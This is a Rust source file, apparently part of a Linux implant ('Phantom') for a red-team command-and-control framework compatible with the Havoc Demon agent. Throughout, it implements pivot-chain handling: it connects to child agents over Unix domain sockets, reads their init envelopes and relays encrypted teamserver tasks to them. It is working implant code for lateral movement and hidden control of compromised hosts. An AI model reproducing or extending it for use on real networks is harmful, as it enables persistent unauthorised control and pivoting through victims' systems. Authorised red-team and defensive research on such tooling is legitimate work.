//! `CommandPivot` (ID 2520): SMB pivot chain management via Unix domain sockets.

use std::io::ErrorKind;
use std::os::unix::net::UnixStream;

use red_cell_common::demon::{DemonCommand, DemonPivotCommand};

use crate::error::PhantomError;
use crate::parser::TaskParser;

use super::encode::*;
use super::types::{PIVOT_MAX_FRAME_SIZE, PendingCallback, PivotConnection};
use super::PhantomState;

/// Handle `CommandPivot` (ID 2520) — SMB pivot chain management.
///
/// On Linux, Phantom uses Unix domain sockets as the local transport for pivot
/// chains instead of Windows named pipes.  The subcommand wire format is
/// identical to the Demon agent so that the teamserver can parse callbacks
/// without special-casing.
pub(super) fn execute_pivot(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let raw_sub = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative pivot subcommand"))?;

    let subcommand = match DemonPivotCommand::try_from(raw_sub) {
        Ok(sub) => sub,
        Err(_) => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("unknown pivot subcommand {raw_sub}"),
            });
            return Ok(());
        }
    };

    match subcommand {
        DemonPivotCommand::List => {
            let mut response = encode_u32(u32::from(DemonPivotCommand::List));
            for (&demon_id, pivot) in &state.smb_pivots {
                response.extend_from_slice(&encode_u32(demon_id));
                response.extend_from_slice(
                    &encode_utf16(&pivot.pipe_name)
                        .map_err(|_| PhantomError::TaskParse("pivot pipe name encode"))?,
                );
            }
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandPivot),
                request_id,
                payload: response,
            });
        }

        DemonPivotCommand::SmbConnect => {
            let pipe_name = parser.wstring()?;
            let mut response = encode_u32(u32::from(DemonPivotCommand::SmbConnect));

            match pivot_connect(&pipe_name) {
                Ok((stream, init_data, agent_id)) => {
                    state.smb_pivots.insert(agent_id, PivotConnection { pipe_name, stream });
                    response.extend_from_slice(&encode_bool(true));
                    response.extend_from_slice(&encode_bytes_result(&init_data));
                }
                Err(message) => {
                    response.extend_from_slice(&encode_bool(false));
                    // Error code — use 0 as a generic "connection failed".
                    response.extend_from_slice(&encode_u32(0));
                    state.queue_callback(PendingCallback::Error {
                        request_id,
                        text: format!("[SMB] pivot connect failed: {message}"),
                    });
                    state.queue_callback(PendingCallback::Structured {
                        command_id: u32::from(DemonCommand::CommandPivot),
                        request_id,
                        payload: response,
                    });
                    return Ok(());
                }
            }

            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandPivot),
                request_id,
                payload: response,
            });
        }

        DemonPivotCommand::SmbDisconnect => {
            let agent_id = parser.int32()? as u32;
            let removed = state.smb_pivots.remove(&agent_id).is_some();

            let mut response = encode_u32(u32::from(DemonPivotCommand::SmbDisconnect));
            response.extend_from_slice(&encode_bool(removed));
            response.extend_from_slice(&encode_u32(agent_id));
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandPivot),
                request_id,
                payload: response,
            });
        }

        DemonPivotCommand::SmbCommand => {
            let agent_id = parser.int32()? as u32;
            let data = parser.bytes()?;

            if let Some(pivot) = state.smb_pivots.get_mut(&agent_id) {
                if let Err(e) = pivot_write_raw(&mut pivot.stream, data) {
                    state.queue_callback(PendingCallback::Error {
                        request_id,
                        text: format!("[SMB] pivot write to {agent_id:08x} failed: {e}"),
                    });
                }
            } else {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("[SMB] pivot {agent_id:08x} not found"),
                });
            }
            // SmbCommand does not send a structured response (matches Demon behaviour).
        }
    }

    Ok(())
}

/// Connect to a child agent's Unix domain socket, read its init packet, and
/// return the stream, raw init data, and parsed child agent ID.
pub(crate) fn pivot_connect(pipe_name: &str) -> Result<(UnixStream, Vec<u8>, u32), String> {
    let stream = UnixStream::connect(pipe_name).map_err(|e| format!("{e}"))?;

    // Read the child's init packet — a length-framed DemonEnvelope.
    stream.set_nonblocking(false).map_err(|e| format!("set_nonblocking: {e}"))?;
    let init_data = pivot_read_envelope_blocking(&stream).map_err(|e| format!("read init: {e}"))?;

    // Parse the child's agent ID from the DemonEnvelope header.
    // Envelope format: [size:4be][magic:4be][agent_id:4be][payload]
    if init_data.len() < 12 {
        return Err("init packet too short to contain DemonHeader".to_owned());
    }
    // Size is at offset 0..4, magic at 4..8, agent_id at 8..12.
    let agent_id = u32::from_be_bytes([init_data[8], init_data[9], init_data[10], init_data[11]]);

    // Switch to non-blocking for subsequent polling.
    stream.set_nonblocking(true).map_err(|e| format!("set_nonblocking: {e}"))?;

    // The init_data returned includes the full envelope (with size prefix),
    // matching what the original Demon sends in the connect callback.
    Ok((stream, init_data, agent_id))
}

/// Read a single Demon envelope from a Unix domain socket (blocking).
///
/// The Demon envelope wire format starts with a big-endian size field:
/// `[size:u32_be][magic:u32_be][agent_id:u32_be][encrypted:size bytes]`.
/// The size field counts everything after itself (magic + agent_id + payload),
/// so total bytes = `4 + size`.
///
/// Returns the complete envelope including the size prefix, matching the data
/// that the original Demon agent returns from `PivotAdd`.
pub(crate) fn pivot_read_envelope_blocking(stream: &UnixStream) -> Result<Vec<u8>, std::io::Error> {
    use std::io::Read as IoRead;

    let mut size_buf = [0u8; 4];
    let mut s = stream;
    IoRead::read_exact(&mut s, &mut size_buf)?;
    let size = u32::from_be_bytes(size_buf) as usize;

    if size > PIVOT_MAX_FRAME_SIZE {
        return Err(std::io::Error::new(
            ErrorKind::InvalidData,
            "pivot frame exceeds maximum size",
        ));
    }

    let mut frame = Vec::with_capacity(4 + size);
    frame.extend_from_slice(&size_buf);
    frame.resize(4 + size, 0);
    IoRead::read_exact(&mut s, &mut frame[4..])?;

    Ok(frame)
}

/// Try to read a single Demon envelope from a non-blocking Unix socket.
///
/// Returns `Ok(Some(frame))` when a complete envelope is available,
/// `Ok(None)` when no data is ready (WouldBlock), or `Err` on I/O failure.
pub(crate) fn pivot_read_frame(stream: &UnixStream) -> Result<Option<Vec<u8>>, std::io::Error> {
    use std::io::Read as IoRead;

    let mut size_buf = [0u8; 4];
    let mut s = stream;
    match IoRead::read_exact(&mut s, &mut size_buf) {
        Ok(()) => {}
        Err(e) if e.kind() == ErrorKind::WouldBlock => return Ok(None),
        Err(e) => return Err(e),
    }

    let size = u32::from_be_bytes(size_buf) as usize;
    if size > PIVOT_MAX_FRAME_SIZE {
        return Err(std::io::Error::new(
            ErrorKind::InvalidData,
            "pivot frame exceeds maximum size",
        ));
    }

    // Once we have the size, switch to blocking to read the remaining bytes.
    stream
        .set_nonblocking(false)
        .map_err(|e| std::io::Error::other(format!("set_nonblocking(false): {e}")))?;

    let mut frame = Vec::with_capacity(4 + size);
    frame.extend_from_slice(&size_buf);
    frame.resize(4 + size, 0);
    let result = IoRead::read_exact(&mut s, &mut frame[4..]);

    // Restore non-blocking regardless of read result.
    let _ = stream.set_nonblocking(true);
    result?;

    Ok(Some(frame))
}

/// Write raw bytes to a pivot Unix domain socket.
///
/// The data is written as-is — it is expected to already be a properly framed
/// Demon envelope (the teamserver provides the encrypted task packet including
/// the size prefix).
pub(crate) fn pivot_write_raw(stream: &mut UnixStream, data: &[u8]) -> Result<(), std::io::Error> {
    use std::io::Write as IoWrite;

    // Temporarily blocking for the write.
    stream.set_nonblocking(false)?;
    let result = IoWrite::write_all(stream, data);
    let _ = stream.set_nonblocking(true);

    result
}
